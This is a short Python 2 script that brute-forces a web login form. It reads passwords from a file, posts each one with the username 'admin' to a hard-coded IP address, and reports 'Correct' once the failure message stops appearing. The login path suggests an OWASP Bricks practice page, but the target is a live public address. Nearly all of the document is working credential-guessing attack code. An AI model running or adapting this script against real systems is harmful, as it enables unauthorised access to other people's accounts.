#!/usr/bin/python

import httplib, urllib
# -*- encoding: utf-8 -*-

infile = open('passwd.txt', 'r')
user = 'admin'
host = '104.25.191.110:443'
path = '/login?destino_login=%2Fbricks/login-1/index.php'
print "Target : "+host+path

for line in infile:
	password=line.rstrip('\n')
	param = urllib.urlencode({'submit':'submit','username':user,'passwd':password})
	header = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	connect = httplib.HTTPConnection(host)
	connect.request("POST", path, param, header)
	response = connect.getresponse()
	print response.status,
	print "--> "+user+":"+password,
	code = response.read()
	if code.find("Wrong user name or password") >= 0:
		print chr(27)+"[0;91m"+"Incorrect"
	        print chr(27)+"[0m"
	else:
		print chr(27)+"[0;92m"+"Correct"
	        print chr(27)+"[0m"
		break
	print chr(27)+"[0m"
	connect.close()
infile.close()
